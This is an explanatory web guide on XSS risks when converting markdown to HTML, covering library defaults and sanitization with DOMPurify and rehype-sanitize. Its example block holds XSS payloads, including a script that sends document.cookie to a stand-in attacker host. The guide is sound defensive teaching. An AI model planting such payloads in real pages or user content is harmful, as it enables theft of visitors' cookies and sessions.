---
title: Is Markdown to HTML Safe? XSS Risks and How to Fix Them
h1: Is converting Markdown to HTML safe from XSS?
description: Markdown converters are not sanitizers. Raw HTML and javascript: links pass through most of them. What to sanitize, where, and with which library.
tool: markdown-to-html
updated: 2026-10-17
related: /guides/markdown-link, /guides/markdown-comment, /markdown-viewer
---
No, not by itself. Markdown allows raw HTML, and most converters copy it into the output untouched, so `<img onerror=...>` or a `javascript:` link written in markdown can reach the page as live code. Converting your own trusted text is fine. Converting text from anyone else is only safe if you sanitize the HTML afterwards.

The reason is in the design of the format. Markdown was meant as a shorthand for writing HTML, not a replacement for it, so any HTML you type is allowed. The CommonMark spec, which most modern parsers follow, defines an HTML block as a group of lines "treated as raw HTML (and will not be escaped in HTML output)" ([CommonMark spec, HTML blocks](https://spec.commonmark.org/0.31.2/#html-blocks)). A converter that follows the spec faithfully is doing its job when it passes a `<script>` tag through. Keeping that script off your page is a separate job, called sanitization.

## What does an XSS attack through markdown look like?

An attacker writes markdown that turns into HTML which runs JavaScript in another visitor's browser. The three common forms are a raw `<script>` tag, an HTML element with an event handler attribute such as `onerror` or `onclick`, and a normal markdown link or image whose URL uses the `javascript:` scheme.

```markdown
[Click for the docs](javascript:alert(document.cookie))

<img src="x" onerror="alert(1)">

<script>fetch('https://attacker.example/?c=' + document.cookie)</script>
```

We ran exactly this input through the unified pipeline that our [Markdown to HTML converter](/markdown-to-html) uses (`remark-parse`, `remark-gfm`, `remark-rehype`, `rehype-stringify`). With raw HTML allowed, all three survive: the link keeps `href="javascript:alert(...)"`, the `<img>` keeps its `onerror`, and the `<script>` tag is copied as written. With raw HTML turned off, the two HTML snippets disappear, but the `javascript:` link and image URL are still in the output. Blocking raw HTML alone does not make the result safe.

## Do popular markdown libraries sanitize by default?

Some do part of the work, none promise a complete answer. Check the defaults of the library you use rather than assuming:

| Library | Raw HTML by default | Dangerous URLs | What the docs say |
|---|---|---|---|
| marked | Passed through | Passed through | "Marked does not sanitize the output HTML" and recommends DOMPurify ([marked README](https://github.com/markedjs/marked#readme)) |
| markdown-it | Off (`html: false`) | `javascript:`, `vbscript:`, `file:` and most `data:` URLs rejected by `validateLink` | Describes itself as "safe by default" ([markdown-it](https://github.com/markdown-it/markdown-it)) |
| remark + remark-rehype | Dropped unless `allowDangerousHtml: true` | Passed through | `allowDangerousHtml` and custom handlers "all provide openings"; use `rehype-sanitize` ([remark-rehype security](https://github.com/remarkjs/remark-rehype#security)) |
| GFM tag filter | Nine tags escaped (`script`, `iframe`, `style`, `textarea` and others) | Not covered | "All other HTML tags are left untouched" ([GFM spec, disallowed raw HTML](https://github.github.com/gfm/#disallowed-raw-html-extension-)) |

The last row matters because people often assume "GitHub Flavored Markdown" means GitHub's safety rules. The tag filter in the GFM spec only escapes a short list of tags; an `<img>` with `onerror` is not on it. GitHub itself does much more after conversion: its `github/markup` project notes that "the HTML is sanitized, aggressively removing things that could harm you", such as `script` tags, inline styles and `class` or `id` attributes, and that the conversion library "itself does no sanitization" ([github/markup](https://github.com/github/markup#readme)). When we sent the example above to GitHub's public [Markdown rendering API](https://docs.github.com/en/rest/markdown/markdown), the `javascript:` link came back as plain text, the `onerror` attribute was gone and the `<script>` tag was escaped. That cleanup is a separate step, and your own site has to do it too.

## How do you sanitize markdown output correctly?

Convert first, then sanitize the final HTML with an allowlist sanitizer, as the last step before the HTML reaches a page. An allowlist keeps only the tags, attributes and URL schemes you name and drops everything else, which is safer than trying to list every dangerous pattern.

In JavaScript, the two common choices are:

- **DOMPurify** on a finished HTML string. OWASP's [XSS prevention cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html#html-sanitization) recommends it for HTML sanitization. On a server it needs a DOM implementation; its README recommends an up-to-date jsdom ([DOMPurify](https://github.com/cure53/DOMPurify#running-dompurify-on-the-server)).
- **rehype-sanitize** inside a unified pipeline. Its default schema follows "how github.com works", and its docs say to place it "after the last unsafe thing" ([rehype-sanitize](https://github.com/rehypejs/rehype-sanitize#security)).

```js
import { unified } from 'unified';
import remarkParse from 'remark-parse';
import remarkGfm from 'remark-gfm';
import remarkRehype from 'remark-rehype';
import rehypeRaw from 'rehype-raw';
import rehypeSanitize from 'rehype-sanitize';
import rehypeStringify from 'rehype-stringify';

const html = String(
  await unified()
    .use(remarkParse)
    .use(remarkGfm)
    .use(remarkRehype, { allowDangerousHtml: true })
    .use(rehypeRaw)        // parse the raw HTML into real nodes
    .use(rehypeSanitize)   // then drop anything not on the allowlist
    .use(rehypeStringify)
    .process(untrustedMarkdown)
);
```

Two rules from OWASP apply to every setup: do not modify HTML after you sanitize it, because any change can undo the cleanup, and keep the sanitizer library updated, because browser behavior changes and new bypasses are found.

## Is the HTML from this converter safe to publish?

It is as safe as the markdown you put in. The [Markdown to HTML converter](/markdown-to-html) runs in your browser, does not sanitize, and deliberately keeps inline HTML such as `<details>`, `<br>` and `<iframe>` because people writing their own content want it. That is the right behavior for your own documents and the wrong one for text from a form, a comment box or an AI model you do not control. If the output is going into a CMS or an email template that accepts raw HTML, sanitize it there, or read through it first: the HTML pane shows exactly what will be published.

## Does escaping or a Content Security Policy make sanitizing unnecessary?

No. Escaping every `<` and `&` makes the output safe but turns it into visible source code, which defeats the point of converting markdown. A Content Security Policy is a good second layer, but OWASP lists "sole reliance on Content-Security-Policy headers" as an approach to avoid, partly because browser support and legacy pages vary. Use CSP in addition to sanitization, not instead of it.

## Which markdown features are risky besides raw HTML?

Links and images are the main ones, because their URLs end up in `href` and `src`. Check that only `http`, `https` and `mailto` (and whatever else you need) are allowed; the [markdown link guide](/guides/markdown-link) covers the link syntax that produces them. Generated ids can also matter: the remark-rehype docs explain that footnote ids built from user content can "clobber" global names in the browser, which is why it prefixes them with `user-content-` by default. HTML comments, explained in the [markdown comment guide](/guides/markdown-comment), are harmless in the output but are still raw HTML, so a sanitizer will usually strip them.

## Is it safe to render markdown in React with react-markdown?

Yes, with its defaults. The react-markdown README says it "is secure by default": it builds React elements instead of using `dangerouslySetInnerHTML`, escapes or ignores raw HTML, and cleans link URLs through its `urlTransform` option ([react-markdown security](https://github.com/remarkjs/react-markdown#security)). The same README warns that replacing `urlTransform` with something insecure, or adding plugins such as `rehype-raw`, can reopen XSS, so add `rehype-sanitize` after `rehype-raw` if you need raw HTML. OWASP also notes that React 19 blocks `javascript:` URLs in `src` and `href`, but says this "does not replace application-specific URL validation".
